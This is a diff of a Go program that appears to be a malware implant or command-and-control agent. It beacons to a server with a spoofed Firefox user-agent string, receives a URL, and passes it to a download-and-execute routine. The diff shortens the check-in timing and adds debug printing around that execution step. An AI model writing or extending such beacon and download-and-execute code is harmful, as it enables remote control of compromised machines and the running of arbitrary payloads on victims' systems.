@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"math/rand"
 	"time"
 
@@ -11,8 +12,8 @@ import (
 const url = "http://127.0.0.1:8000"
 const agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
 const offset = 12 // In seconds
-const base = 1    // In hours
-const sleep = 60  // In seconds
+const base = 0    // In hours
+const sleep = 1  // In seconds
 
 func main() {
 	sysid := "uuid"
@@ -23,7 +24,12 @@ func main() {
 	for {
 		if checkIn.Before(time.Now()) {
 			url := beacon.Ping()
-			downloader.DownloadExec(url)
+			
+			if url != "" {
+				fmt.Println(url)
+				downloader.DownloadExec(url)
+			}
+			
 			checkIn = updateCheckinTime()
 		}
 
